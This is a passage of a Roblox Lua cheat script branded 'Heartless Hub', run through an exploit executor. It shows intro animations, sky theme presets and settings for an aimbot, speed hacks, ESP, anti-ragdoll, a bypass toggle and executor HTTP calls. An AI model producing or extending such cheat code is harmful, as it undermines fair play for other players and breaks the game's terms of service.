                local chars = {"O","C","E","A","N"," ","H","U","B","#","$","%","@","!","?"}
                task.spawn(function()
                    for step = 1, #full + 8 do
                        if not active or _introSkipRequested then return end
                        local out = ""
                        for j = 1, #full do
                            if j < step - 2 then
                                out = out .. full:sub(j, j)
                            else
                                out = out .. chars[math.random(1, #chars)]
                            end
                        end
                        glitch.Text = out
                        task.wait(0.07)
                    end
                    if active then glitch.Text = full end
                end)
                if not aliveWait(1.4) then finishIntro(); return end
                local tag4 = Instance.new("TextLabel", bg)
                tag4.AnchorPoint = Vector2.new(0.5, 0.5)
                tag4.Position = UDim2.fromScale(0.5, 0.58)
                tag4.Size = UDim2.new(0.8, 0, 0, 24)
                tag4.BackgroundTransparency = 1
                tag4.Text = "GLITCH  ·  TYPEWRITER"
                tag4.TextColor3 = ACC
                tag4.TextTransparency = 1
                tag4.Font = Enum.Font.Code
                tag4.TextSize = 14
                tag4.ZIndex = 25
                playTw(tag4, 0.4, {TextTransparency = 0})
                -- flash glitch offsets
                local t0 = tick()
                while active and not _introSkipRequested and (tick() - t0) < 3.5 do
                    if math.random() < 0.12 then
                        glitch.Position = UDim2.fromScale(0.5 + (math.random() - 0.5) * 0.04, 0.45 + (math.random() - 0.5) * 0.02)
                        glitch.TextColor3 = (math.random() < 0.5) and ACC or WHITE
                        task.wait(0.04)
                        glitch.Position = UDim2.fromScale(0.5, 0.45)
                        glitch.TextColor3 = WHITE
                    end
                    task.wait(0.05)
                end
                playTw(glitch, 0.35, {TextTransparency = 1})
                playTw(tag4, 0.35, {TextTransparency = 1})
                playTw(veil, 0.4, {BackgroundTransparency = 0})
                if not aliveWait(0.45) then finishIntro(); return end
                finishIntro()
                return

            elseif style == 5 then
                bg.BackgroundColor3 = Color3.fromRGB(6, 10, 16)
                playTw(bg, 0.35, {BackgroundTransparency = 0})
                local radar = Instance.new("Frame", bg)
                radar.AnchorPoint = Vector2.new(0.5, 0.5)
                radar.Position = UDim2.fromScale(0.5, 0.42)
                radar.Size = UDim2.fromOffset(260, 260)
                radar.BackgroundTransparency = 1
                radar.ZIndex = 10
                for r = 1, 4 do
                    local ring = Instance.new("Frame", radar)
                    ring.AnchorPoint = Vector2.new(0.5, 0.5)
                    ring.Position = UDim2.fromScale(0.5, 0.5)
                    ring.Size = UDim2.fromOffset(50 + r * 50, 50 + r * 50)
                    ring.BackgroundTransparency = 1
                    ring.ZIndex = 11
                    Instance.new("UICorner", ring).CornerRadius = UDim.new(1, 0)
                    local st = Instance.new("UIStroke", ring)
                    st.Color = ACC
                    st.Thickness = 1.2
                    st.Transparency = 0.35 + r * 0.1
                end
                -- crosshairs
                local hLine = Instance.new("Frame", radar)
                hLine.Size = UDim2.new(1, 0, 0, 1)
                hLine.Position = UDim2.new(0, 0, 0.5, 0)
                hLine.BackgroundColor3 = ACC
                hLine.BackgroundTransparency = 0.5
                hLine.BorderSizePixel = 0
                hLine.ZIndex = 12
                local vLine = Instance.new("Frame", radar)
                vLine.Size = UDim2.new(0, 1, 1, 0)
                vLine.Position = UDim2.new(0.5, 0, 0, 0)
                vLine.BackgroundColor3 = ACC
                vLine.BackgroundTransparency = 0.5
                vLine.BorderSizePixel = 0
                vLine.ZIndex = 12
                -- sweep beam
                local beam = Instance.new("Frame", radar)
                beam.AnchorPoint = Vector2.new(0.5, 1)
                beam.Position = UDim2.fromScale(0.5, 0.5)
                beam.Size = UDim2.fromOffset(3, 130)
                beam.BackgroundColor3 = WHITE
                beam.BackgroundTransparency = 0.15
                beam.BorderSizePixel = 0
                beam.ZIndex = 15
                local core = Instance.new("Frame", radar)
                core.AnchorPoint = Vector2.new(0.5, 0.5)
                core.Position = UDim2.fromScale(0.5, 0.5)
                core.Size = UDim2.fromOffset(14, 14)
                core.BackgroundColor3 = ACC
                core.BorderSizePixel = 0
                core.ZIndex = 16
                Instance.new("UICorner", core).CornerRadius = UDim.new(1, 0)
                local blips = {}
                for i = 1, 6 do
                    local b = Instance.new("Frame", radar)
                    b.AnchorPoint = Vector2.new(0.5, 0.5)
                    local ang = math.rad(i * 55)
                    local rad = 40 + (i % 3) * 35
                    b.Position = UDim2.new(0.5, math.cos(ang) * rad, 0.5, math.sin(ang) * rad)
                    b.Size = UDim2.fromOffset(8, 8)
                    b.BackgroundColor3 = WHITE
                    b.BackgroundTransparency = 0.2
                    b.BorderSizePixel = 0
                    b.ZIndex = 14
                    Instance.new("UICorner", b).CornerRadius = UDim.new(1, 0)
                    blips[i] = b
                end
                local title5 = Instance.new("TextLabel", bg)
                title5.AnchorPoint = Vector2.new(0.5, 0.5)
                title5.Position = UDim2.fromScale(0.5, 0.72)
                title5.Size = UDim2.new(0.9, 0, 0, 40)
                title5.BackgroundTransparency = 1
                title5.Text = "Heartless Hub"
                title5.TextColor3 = WHITE
                title5.TextTransparency = 1
                title5.Font = Enum.Font.GothamBlack
                title5.TextSize = 32
                title5.ZIndex = 20
                playTw(title5, 0.5, {TextTransparency = 0})
                local tag5 = Instance.new("TextLabel", bg)
                tag5.AnchorPoint = Vector2.new(0.5, 0.5)
                tag5.Position = UDim2.fromScale(0.5, 0.8)
                tag5.Size = UDim2.new(0.8, 0, 0, 20)
                tag5.BackgroundTransparency = 1
                tag5.Text = "RADAR  ·  SWEEP"
                tag5.TextColor3 = ACC
                tag5.TextTransparency = 1
                tag5.Font = Enum.Font.GothamBold
                tag5.TextSize = 12
                tag5.ZIndex = 20
                playTw(tag5, 0.4, {TextTransparency = 0.1})
                local t0 = tick()
                while active and not _introSkipRequested and (tick() - t0) < 5.5 do
                    local a = (tick() - t0) * 120
                    beam.Rotation = a
                    for i, b in ipairs(blips) do
                        local pulse = 0.15 + 0.5 * math.abs(math.sin((tick() - t0) * 3 + i))
                        b.BackgroundTransparency = pulse
                    end
                    task.wait(0.03)
                end
                playTw(title5, 0.3, {TextTransparency = 1})
                playTw(tag5, 0.3, {TextTransparency = 1})
                playTw(radar, 0.4, {Size = UDim2.fromOffset(0, 0)})
                playTw(veil, 0.4, {BackgroundTransparency = 0})
                if not aliveWait(0.45) then finishIntro(); return end
                finishIntro()
                return

            elseif style == 6 then
                playTw(bg, 0.2, {BackgroundTransparency = 0})
                bg.BackgroundColor3 = ACC
                local topCurtain = Instance.new("Frame", bg)
                topCurtain.Size = UDim2.fromScale(1, 0.5)
                topCurtain.Position = UDim2.fromScale(0, 0)
                topCurtain.BackgroundColor3 = Color3.fromRGB(6, 8, 14)
                topCurtain.BorderSizePixel = 0
                topCurtain.ZIndex = 30
                local botCurtain = Instance.new("Frame", bg)
                botCurtain.Size = UDim2.fromScale(1, 0.5)
                botCurtain.Position = UDim2.fromScale(0, 0.5)
                botCurtain.BackgroundColor3 = Color3.fromRGB(6, 8, 14)
                botCurtain.BorderSizePixel = 0
                botCurtain.ZIndex = 30
                local chrome = Instance.new("Frame", bg)
                chrome.AnchorPoint = Vector2.new(0.5, 0.5)
                chrome.Position = UDim2.fromScale(0.5, 0.5)
                chrome.Size = UDim2.new(1, 0, 0, 6)
                chrome.BackgroundColor3 = WHITE
                chrome.BorderSizePixel = 0
                chrome.ZIndex = 35
                local logo = Instance.new("TextLabel", bg)
                logo.AnchorPoint = Vector2.new(0.5, 0.5)
                logo.Position = UDim2.fromScale(0.5, 0.42)
                logo.Size = UDim2.new(0.9, 0, 0, 64)
                logo.BackgroundTransparency = 1
                logo.Text = "Heartless Hub"
                logo.TextColor3 = WHITE
                logo.TextTransparency = 1
                logo.Font = Enum.Font.GothamBlack
                logo.TextSize = 52
                logo.ZIndex = 20
                local sub6 = Instance.new("TextLabel", bg)
                sub6.AnchorPoint = Vector2.new(0.5, 0.5)
                sub6.Position = UDim2.fromScale(0.5, 0.55)
                sub6.Size = UDim2.new(0.8, 0, 0, 24)
                sub6.BackgroundTransparency = 1
                sub6.Text = "CURTAIN  ·  REVEAL"
                sub6.TextColor3 = Color3.fromRGB(20, 20, 28)
                sub6.TextTransparency = 1
                sub6.Font = Enum.Font.GothamBold
                sub6.TextSize = 14
                sub6.ZIndex = 20
                -- hold curtains closed briefly
                if not aliveWait(0.4) then finishIntro(); return end
                playTw(topCurtain, 0.85, {Position = UDim2.fromScale(0, -0.55)}, Enum.EasingStyle.Quint, Enum.EasingDirection.In)
                playTw(botCurtain, 0.85, {Position = UDim2.fromScale(0, 1.05)}, Enum.EasingStyle.Quint, Enum.EasingDirection.In)
                playTw(chrome, 0.5, {Size = UDim2.fromOffset(0, 6), BackgroundTransparency = 1})
                if not aliveWait(0.5) then finishIntro(); return end
                playTw(logo, 0.55, {TextTransparency = 0}, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
                playTw(sub6, 0.45, {TextTransparency = 0.1})
                -- soft pulse on accent bg
                if not aliveWait(3.8) then finishIntro(); return end
                -- close curtains again
                playTw(logo, 0.3, {TextTransparency = 1})
                playTw(sub6, 0.3, {TextTransparency = 1})
                playTw(topCurtain, 0.55, {Position = UDim2.fromScale(0, 0)})
                playTw(botCurtain, 0.55, {Position = UDim2.fromScale(0, 0.5)})
                if not aliveWait(0.6) then finishIntro(); return end
                finishIntro()
                return

            end

            playTw(bg, 0.55, {BackgroundTransparency = 0}, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
            for i, o in ipairs(orbs) do
                local sz = 80 + i * 28
                playTw(o, 0.7 + i * 0.05, {
                    Size = UDim2.fromOffset(sz, sz),
                    BackgroundTransparency = 0.88 + (i % 3) * 0.02,
                }, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
            end
            if not aliveWait(0.55) then finishIntro(); return end

            for i, L in ipairs(letters) do
                local finalX = L.Position.X.Offset
                if L.Position.Y.Offset ~= 0 or math.abs(L.Position.X.Offset - (70 + (math.min(i, 5) - 1) * 44)) > 200 then
                end
                local targetX
                if i <= 5 then
                    targetX = 70 + (i - 1) * 44
                else
                    targetX = 320 + (i - 6) * 44
                end
                task.delay((i - 1) * 0.09, function()
                    if not active or not L.Parent then return end
                    playTw(L, 0.65, {
                        Position = UDim2.new(0, targetX, 0.5, 0),
                        TextTransparency = 0,
                    }, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
                end)
            end
            if not aliveWait(1.65) then finishIntro(); return end

            -- soft letter pulse
            for _, L in ipairs(letters) do
                playTw(L, 0.25, {TextSize = 52}, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
            end
            if not aliveWait(0.25) then finishIntro(); return end
            for _, L in ipairs(letters) do
                playTw(L, 0.3, {TextSize = 48}, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
            end

            -- subtitle + tag
            playTw(sub, 0.55, {TextTransparency = 0.08, Position = UDim2.fromScale(0.5, 0.56)}, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
            if not aliveWait(0.35) then finishIntro(); return end
            playTw(tag, 0.5, {TextTransparency = 0.2}, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)

            playTw(barFill, 4.0, {Size = UDim2.new(1, 0, 1, 0)}, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
            -- gentle orb drift during hold
            for i, o in ipairs(orbs) do
                local p0 = o.Position
                playTw(o, 4.0, {
                    Position = UDim2.fromScale(
                        math.clamp(p0.X.Scale + (i % 2 == 0 and 0.04 or -0.04), 0.05, 0.95),
                        math.clamp(p0.Y.Scale + (i % 2 == 0 and -0.03 or 0.03), 0.1, 0.9)
                    ),
                }, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut)
            end
            if not aliveWait(4.1) then finishIntro(); return end

            for i, L in ipairs(letters) do
                local dir = dirs[i] or "up"
                local dx, dy = 0, 0
                if dir == "up" then dy = -120
                elseif dir == "down" then dy = 120
                elseif dir == "left" then dx = -140
                else dx = 140 end
                playTw(L, 0.45, {
                    Position = UDim2.new(0, L.Position.X.Offset + dx, 0.5, dy),
                    TextTransparency = 1,
                }, Enum.EasingStyle.Quad, Enum.EasingDirection.In)
            end
            playTw(sub, 0.35, {TextTransparency = 1})
            playTw(tag, 0.35, {TextTransparency = 1})
            playTw(veil, 0.5, {BackgroundTransparency = 0}, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
            if not aliveWait(0.55) then finishIntro(); return end
            finishIntro()
        end)
    end)
end

repeat task.wait() until game:IsLoaded()

pcall(function()
    if UIS and UIS.TouchEnabled then
        mobileButtonsEnabled = true
    end
end)

CANDY_SKY_TAG = "MoveeSkyTheme"
currentSkyTheme = "Night"
CANDY_SKY_PRESETS = {
    ["Off"]={kind="off"},
    ["Night"]={clock=22,brightness=2,ambient={110,100,130},outAmb={120,110,140},sky={stars=4000,moon=18,sun=0,moonTex=true},atm={dens=0.45,color={120,60,180},decay={60,20,100},glare=0.5,haze=1.2}},
    ["Aurora"]={clock=14,brightness=3,ambient={150,120,150},outAmb={160,130,150},atm={dens=0.55,color={255,80,200},decay={255,20,150},glare=2.5,haze=3},clouds={cover=0.7,dens=0.7,color={255,240,250}}},
    ["Sunset"]={clock=17.2,brightness=2.5,ambient={170,120,100},outAmb={180,130,110},sky={stars=0,sun=25,moon=0},atm={dens=0.5,color={255,130,60},decay={255,80,30},glare=2,haze=2.5},clouds={cover=0.55,dens=0.55,color={255,200,140}}},
    ["Galaxy"]={clock=0,brightness=1.5,ambient={70,60,100},outAmb={80,70,110},sky={stars=10000,moon=30,sun=0},atm={dens=0.15,color={40,20,80},decay={20,10,50},glare=0.3,haze=0.5}},
    ["Cyber"]={clock=21,brightness=2.2,ambient={90,130,170},outAmb={100,140,180},sky={stars=2000,moon=12},atm={dens=0.4,color={0,200,255},decay={150,0,255},glare=2,haze=2},clouds={cover=0.4,dens=0.6,color={100,200,255}}},
    ["Sakura"]={clock=11,brightness=3.5,ambient={170,150,160},outAmb={180,160,170},sky={sun=8},atm={dens=0.3,color={255,200,220},decay={255,170,200},glare=1,haze=1.5},clouds={cover=0.6,dens=0.4,color={255,250,252}}},
    ["Pink Night"]={clock=23,brightness=2.2,ambient={120,60,110},outAmb={140,70,120},sky={stars=5000,moon=22,sun=0,moonTex=true},atm={dens=0.5,color={255,80,180},decay={140,30,100},glare=0.7,haze=1.4},clouds={cover=0.3,dens=0.5,color={180,90,150}}},
    ["Blood Moon"]={clock=22.5,brightness=1.6,ambient={130,40,40},outAmb={150,50,50},sky={stars=1500,moon=28,sun=0,moonTex=true},atm={dens=0.6,color={220,30,30},decay={120,10,10},glare=1.4,haze=2},clouds={cover=0.5,dens=0.7,color={120,30,30}}},
    ["Emerald Dawn"]={clock=6.5,brightness=2.8,ambient={130,170,140},outAmb={140,180,150},sky={sun=18,moon=0,stars=0},atm={dens=0.4,color={80,200,140},decay={40,150,90},glare=1.8,haze=2.2},clouds={cover=0.5,dens=0.5,color={200,255,220}}},
    ["Volcanic"]={clock=19,brightness=2,ambient={180,80,40},outAmb={200,90,50},sky={stars=200,sun=12,moon=0},atm={dens=0.75,color={255,60,0},decay={180,20,0},glare=3,haze=3.5},clouds={cover=0.8,dens=0.9,color={120,40,20}}},
    ["Arctic"]={clock=9,brightness=3.2,ambient={200,220,235},outAmb={210,230,245},sky={sun=10,stars=0,moon=0},atm={dens=0.3,color={180,220,255},decay={140,200,240},glare=1.5,haze=1.8},clouds={cover=0.7,dens=0.6,color={250,253,255}}},
    ["Midnight Ocean"]={clock=1.5,brightness=1.7,ambient={60,90,130},outAmb={70,100,140},sky={stars=6000,moon=24,sun=0,moonTex=true},atm={dens=0.5,color={20,60,140},decay={10,30,90},glare=0.6,haze=1.5}},
    ["Vaporwave"]={clock=19.5,brightness=2.4,ambient={180,120,200},outAmb={190,130,210},sky={stars=1000,moon=14},atm={dens=0.45,color={255,100,220},decay={120,60,255},glare=2.2,haze=2.4},clouds={cover=0.5,dens=0.55,color={200,150,255}}},
    ["Toxic"]={clock=13,brightness=2.5,ambient={140,180,80},outAmb={150,190,90},atm={dens=0.55,color={100,220,40},decay={60,150,20},glare=1.8,haze=2.6},clouds={cover=0.65,dens=0.7,color={180,255,120}}},
    ["Solar Eclipse"]={clock=12,brightness=0.9,ambient={50,40,60},outAmb={60,50,70},sky={stars=3500,sun=22,moon=0},atm={dens=0.5,color={255,140,40},decay={30,20,40},glare=2.8,haze=1.8}},
    ["Hellscape"]={clock=18,brightness=1.8,ambient={200,60,30},outAmb={220,70,40},sky={stars=100,sun=30,moon=0},atm={dens=0.85,color={255,30,0},decay={120,0,0},glare=3.5,haze=4},clouds={cover=0.95,dens=0.95,color={80,20,10}}},
    ["Heaven"]={clock=12,brightness=4,ambient={240,235,210},outAmb={250,245,220},sky={sun=16,moon=0,stars=0},atm={dens=0.25,color={255,250,220},decay={255,240,200},glare=3,haze=1.5},clouds={cover=0.85,dens=0.5,color={255,255,255}}},
    ["Storm"]={clock=15,brightness=1.4,ambient={90,90,110},outAmb={100,100,120},sky={stars=0,sun=6,moon=0},atm={dens=0.65,color={80,90,120},decay={40,50,80},glare=0.5,haze=3},clouds={cover=0.95,dens=0.95,color={60,65,80}}},
    ["Sunrise"]={clock=6.2,brightness=2.8,ambient={220,180,130},outAmb={230,190,140},sky={sun=22,stars=0,moon=0},atm={dens=0.45,color={255,180,100},decay={255,140,80},glare=2.4,haze=2.2},clouds={cover=0.4,dens=0.4,color={255,220,180}}},
    ["Deep Space"]={clock=0,brightness=1,ambient={30,25,50},outAmb={40,35,60},sky={stars=15000,moon=0,sun=0},atm={dens=0.08,color={15,5,40},decay={5,0,20},glare=0.2,haze=0.3}},
    ["Lavender Dream"]={clock=18.5,brightness=2.6,ambient={180,160,220},outAmb={190,170,230},sky={stars=800,moon=16,sun=0},atm={dens=0.4,color={200,160,255},decay={160,120,220},glare=1.4,haze=1.8},clouds={cover=0.55,dens=0.5,color={220,200,255}}},
    ["Inferno"]={clock=17.5,brightness=2.2,ambient={220,100,40},outAmb={235,110,50},sky={sun=26,moon=0,stars=0},atm={dens=0.6,color={255,90,20},decay={200,40,0},glare=3,haze=3.2},clouds={cover=0.7,dens=0.7,color={200,80,40}}},
    ["Mint Sky"]={clock=10,brightness=3.2,ambient={180,230,210},outAmb={190,240,220},sky={sun=10},atm={dens=0.32,color={150,255,210},decay={100,220,180},glare=1.6,haze=1.6},clouds={cover=0.55,dens=0.45,color={240,255,250}}},
}
SkyOrder={"Off","Night","Aurora","Sunset","Galaxy","Cyber","Sakura","Pink Night","Blood Moon","Emerald Dawn","Volcanic","Arctic","Midnight Ocean","Vaporwave","Toxic","Solar Eclipse","Hellscape","Heaven","Storm","Sunrise","Deep Space","Lavender Dream","Inferno","Mint Sky"}
function candyColor(rgb) return Color3.fromRGB(rgb[1],rgb[2],rgb[3]) end
function CandyApplyCustomSky(mode)
    for _,child in ipairs(Lighting:GetChildren()) do if child:GetAttribute(CANDY_SKY_TAG) then pcall(function() child:Destroy() end) end end
    local terrain=workspace:FindFirstChildOfClass("Terrain")
    if terrain then for _,child in ipairs(terrain:GetChildren()) do if child:GetAttribute(CANDY_SKY_TAG) then pcall(function() child:Destroy() end) end end end
    local preset=CANDY_SKY_PRESETS[mode]
    if not preset or preset.kind=="off" then Lighting.ClockTime=14;Lighting.Brightness=2;Lighting.OutdoorAmbient=Color3.fromRGB(127,127,127);Lighting.Ambient=Color3.fromRGB(127,127,127);Lighting.FogEnd=100000;Lighting.GlobalShadows=true;return end
    Lighting.FogStart=0;Lighting.FogEnd=100000;Lighting.FogColor=Color3.fromRGB(200,200,200);Lighting.ColorShift_Top=Color3.fromRGB(0,0,0);Lighting.ColorShift_Bottom=Color3.fromRGB(0,0,0);Lighting.GlobalShadows=true
    Lighting.ClockTime=preset.clock or 14;Lighting.Brightness=preset.brightness or 2
    if preset.outAmb then Lighting.OutdoorAmbient=candyColor(preset.outAmb) end
    if preset.ambient then Lighting.Ambient=candyColor(preset.ambient) end
    if preset.sky then
        local skyInst=Instance.new("Sky");skyInst:SetAttribute(CANDY_SKY_TAG,true)
        if preset.sky.stars then skyInst.StarCount=preset.sky.stars end
        if preset.sky.moon then skyInst.MoonAngularSize=preset.sky.moon end
        if preset.sky.sun then skyInst.SunAngularSize=preset.sky.sun end
        if preset.sky.moonTex then skyInst.MoonTextureId="rbxasset://sky/moon.jpg" end
        skyInst.Parent=Lighting
    end
    if preset.atm then
        local atm=Instance.new("Atmosphere");atm:SetAttribute(CANDY_SKY_TAG,true)
        atm.Density=preset.atm.dens or 0.3;atm.Color=candyColor(preset.atm.color);atm.Decay=candyColor(preset.atm.decay);atm.Glare=preset.atm.glare or 1;atm.Haze=preset.atm.haze or 1;atm.Parent=Lighting
    end
    if preset.clouds and terrain then
        local clouds=Instance.new("Clouds");clouds:SetAttribute(CANDY_SKY_TAG,true)
        clouds.Cover=preset.clouds.cover or 0.5;clouds.Density=preset.clouds.dens or 0.5;clouds.Color=candyColor(preset.clouds.color);clouds.Parent=terrain
    end
end

TS=TweenService
LP=Players.LocalPlayer
NS,CS=59,28
LAGGER_SPEED=30
LAGGER_CARRY_SPEED=15
carrySpeedActive = false
laggerModeEnabled = false

local speedAttachment = nil
local speedLinearVelocity = nil

local function destroySpeedConstraint()
    if speedLinearVelocity then
        pcall(function() speedLinearVelocity:Destroy() end)
        speedLinearVelocity = nil
    end
    if speedAttachment then
        pcall(function() speedAttachment:Destroy() end)
        speedAttachment = nil
    end
end

local function ensureSpeedConstraint(hrp)
    if speedLinearVelocity and speedLinearVelocity.Parent == hrp then
        return speedLinearVelocity
    end
    destroySpeedConstraint()

    local att = Instance.new("Attachment")
    att.Name = "RootAttachment_H"
    att.Parent = hrp
    speedAttachment = att

    local lv = Instance.new("LinearVelocity")
    lv.Name = "MoveController"
    lv.Attachment0 = att
    lv.MaxForce = 40000
    lv.RelativeTo = Enum.ActuatorRelativeTo.World
    lv.VelocityConstraintMode = Enum.VelocityConstraintMode.Plane
    lv.PrimaryTangentAxis = Vector3.new(1, 0, 0)
    lv.SecondaryTangentAxis = Vector3.new(0, 0, 1)
    lv.PlaneVelocity = Vector2.zero
    lv.Parent = hrp
    speedLinearVelocity = lv
    return lv
end

antiRagdollEnabled,infJumpEnabled,antiDieEnabled=false,false,false
medusaCounterEnabled,batCounterEnabled,unwalkEnabled=false,false,false
baseThemeMode="Normal"  -- Normal | Lava | Candy
baseColorSaved={}
baseThemeConn=nil
medusaDebounce,medusaLastUsed,dropActive=false,0,false
autoLeftEnabled,autoRightEnabled=false,false
autoLeftSetVisual,autoRightSetVisual=nil,nil
speedLabel=nil
autoBatEnabled=false
aimbotSpeed=58
autoSwingEnabled=true
autoMoveSwingEnabled=false
autoMoveSwingInterval=0.3
_alSwingDebounce=false
_arSwingDebounce=false
autoBatSetVisual=nil
resetAutoBatMotion=nil
setBatCounterVisual=nil

antiLagEnabled,removeAccessoriesEnabled,antiLagDescConn=false,false,nil
stretchRezEnabled,stretchRezConn,setStretchRezVisual=false,nil,nil
unwalkSavedAnimate,_anyKeyListening=nil,false
autoTPEnabled,autoTPHeight,autoTPConn,setAutoTPVisual=false,20,nil,nil
cursedResetRemote=nil
CURSED_RESET_GUID="f888ee6e-c86d-46e1-93d7-0639d6635d42"
guiTransparencyEnabled,mobileButtonsEnabled,mobileButtonsLocked=false,true,false
mobileButtonsSize=(UIS.TouchEnabled and 72 or 64)
mobileButtonsLayout="panel" -- panel | individual
trackerEnabled=false
trackerMode="keyboard"
trackerScale=1
trackerBgEnabled=false
trackerPosSX,trackerPosSY,trackerPosOX,trackerPosOY=0.5,0.72,0,0

circleButtonsEnabled=false
mobileButtonShape="rounded" -- square|rounded|circle|oval|hexagon|pentagon

mobBtnRefs={}
mobGuiRef=nil
fovValue=80
fovOptions={80,120,180}
fovIndex=1
uiScaleValue=1
laggerModePillRef=nil
carryModePillRef=nil
autoSwitchSpeedEnabled=false
mobBtnTransparencyEnabled=false
perButtonDragEnabled=false
brainrotDetected=false
activeBatBillboard=nil
activeMedusaBillboard=nil
ragdollGuiEnabled=true
ragdollGuiPos = "UP" -- UP (screen fixed) | UNDER_SPEED (billboard under speed)
_activeRagdollCard = nil
_activeRagdollHost = nil
persistentRagdollGui=nil
uiLocked=false
infJumpMode="manual"
holdInfJumpConn=nil
DROP_ASCEND_DURATION=0.22
DROP_ASCEND_SPEED=160
_dropConn=nil
_GuiKeys = nil
_SavedGuiKeys = nil

autoBatV2Enabled = false -- removed

mirrorTPDownEnabled = false
mirrorTPPreviousY = {}
mirrorTPLastTeleport = 0
MIRROR_TP_DOWN_Y = -7
MIRROR_TP_DROP_THRESHOLD = 3

speedEspEnabled = false
speedEspEntries = {}
pcall(function() if stopSpeedESP then stopSpeedESP() end end)
speedEspConn = nil

aimbotMode = "v1"
tpBatVersion = "v1" -- "v1" Ocean original | "v2" 7UP AntiDesync

mobBtnBgId = ""

TPBat = {enabled=false, setVisual=nil, start=nil, stop=nil}
if type(tpBatDistance) ~= "number" then tpBatDistance = 8 end

animEnabled = false
headlessEnabled = false
korbloxEnabled = false
korbloxLeg = "Both"
blueEspEnabled = false
bypassEnabled = false
laggerPanelEnabled = false
bypassFxEnabled = true
bypassFxMode = "normal" -- normal | rainbow  (color)
bypassFxStyle = "node" -- node | classic | pulse
guiPositionsSaved = false
hubPosSX, hubPosOX, hubPosSY, hubPosOY = 0.5, -210, 0.5, -290
bypassPosSX, bypassPosOX, bypassPosSY, bypassPosOY = 0.5, 0, 0.5, 0
laggerPosSX, laggerPosOX, laggerPosSY, laggerPosOY = 0.12, 0, 0.55, 0
_hubMainRef = nil
_olMainRef = nil

THEME_BG_IMAGE_ID = "83356008646946"
DEFAULT_BG_ID = "83356008646946"
customBgId = "83356008646946"
themeBgFrame = nil  -- ImageLabel, set once the main GUI is built

function resolveBackgroundImage(raw)
    if not raw then return nil end
    local s = tostring(raw):gsub("%s+", "")
    s = s:gsub("rbxassetid://", "")
    s = s:gsub("rbxthumb://[^%d]*", "")
    s = s:gsub("rbxhttp://", "")
    s = s:gsub("https?://www%.roblox%.com/asset/%?id=", "")
    s = s:gsub("https?://roblox%.com/asset/%?id=", "")
    s = s:gsub("https?://create%.roblox%.com/store/asset/", "")
    s = s:gsub("https?://www%.roblox%.com/library/", "")
    s = s:gsub("https?://www%.roblox%.com/catalog/", "")
    s = s:gsub("https?://thumbnails%.roblox%.com/[^%d]*", "")
    local qid = s:match("id=(%d+)")
    if qid then s = qid end
    local id = s:match("(%d+)")
    if not id then return nil end

    local results = {}

    pcall(function()
        local objs = game:GetObjects("rbxassetid://" .. id)
        if type(objs) == "table" and objs[1] then
            local obj = objs[1]
            if obj:IsA("Decal") or obj:IsA("Texture") then
                if obj.Texture and obj.Texture ~= "" then
                    table.insert(results, obj.Texture)
                end
            elseif obj:IsA("ImageLabel") or obj:IsA("ImageButton") then
                if obj.Image and obj.Image ~= "" then
                    table.insert(results, obj.Image)
                end
            else
                local dec = obj:FindFirstChildWhichIsA("Decal", true) or obj:FindFirstChildWhichIsA("Texture", true)
                if dec and dec.Texture and dec.Texture ~= "" then
                    table.insert(results, dec.Texture)
                end
            end
            pcall(function() obj:Destroy() end)
        end
    end)

    pcall(function()
        local info = game:GetService("MarketplaceService"):GetProductInfo(tonumber(id))
        if info and info.AssetTypeId then
            if info.IconImageAssetId and info.IconImageAssetId > 0 then
                table.insert(results, "rbxassetid://" .. tostring(info.IconImageAssetId))
            end
        end
    end)

    pcall(function()
        local api = "https://thumbnails.roblox.com/v1/assets?assetIds=" .. id .. "&size=420x420&format=Png&isCircular=false"
        local body = nil
        if type(game.HttpGet) == "function" then
            body = game:HttpGet(api)
        elseif type(request) == "function" then
            local resp = request({Url = api, Method = "GET"})
            body = resp and (resp.Body or resp.body)
        elseif type(http_request) == "function" then
            local resp = http_request({Url = api, Method = "GET"})
            body = resp and (resp.Body or resp.body)
        elseif syn and type(syn.request) == "function" then
            local resp = syn.request({Url = api, Method = "GET"})
            body = resp and (resp.Body or resp.body)
        end
        if type(body) == "string" then
            local img = body:match('"imageUrl"%s*:%s*"(.-)"')
            if img and img ~= "" then
                img = img:gsub("\\u0026", "&"):gsub("\\/", "/")
                table.insert(results, 1, img) -- prefer CDN
            end
        end
    end)

    table.insert(results, "rbxthumb://type=Asset&id=" .. id .. "&w=420&h=420")
    table.insert(results, "rbxthumb://type=Asset&id=" .. id .. "&w=150&h=150")
    -- E) plain asset id last
    table.insert(results, "rbxassetid://" .. id)

    return results, id
end

function applyThemeBackground()
    if not themeBgFrame then return end
    local raw = (customBgId and customBgId ~= "") and tostring(customBgId):gsub("%s+",""):gsub("rbxassetid://","") or ""
    if raw == "" or not raw:match("^%d+$") then
        themeBgFrame.Image = ""
        themeBgFrame.Visible = false
        themeBgFrame.ImageTransparency = 1
        return
    end
    themeBgFrame.Visible = true
    themeBgFrame.BackgroundTransparency = 1
    pcall(function()
        themeBgFrame.ScaleType = Enum.ScaleType.Crop
        themeBgFrame.ResampleMode = Enum.ResamplerMode.Default
    end)
    local targetUrl = "rbxthumb://type=Asset&id=" .. raw .. "&w=420&h=420"
    local gen = (themeBgFrame:GetAttribute("BgGen") or 0) + 1
    themeBgFrame:SetAttribute("BgGen", gen)
    themeBgFrame.ImageTransparency = 0.10
    themeBgFrame.Image = targetUrl
    themeBgFrame.Visible = true
end

-- Steal bar position UP / DOWN / CUSTOM
stealBarPos = "UP"
stealBarCustomX = 0.5
stealBarCustomY = 0.02
stealBarFrame = nil
stealBarStyle = 1 -- 1=Ocean, 2=R1tual, 3=duel, 4=premium, 5=basic

watermarkEnabled = false
watermarkCustomX = 0.5
watermarkCustomY = 0.02
watermarkGui = nil
watermarkFrame = nil

highPingWarnEnabled = true
highPingThreshold = 150
_highPingGui = nil
_highPingConn = nil

function destroyHighPingWarn()
    if _highPingConn then pcall(function() _highPingConn:Disconnect() end); _highPingConn = nil end
    if _highPingGui then pcall(function() _highPingGui:Destroy() end); _highPingGui = nil end
end

function createHighPingWarn()
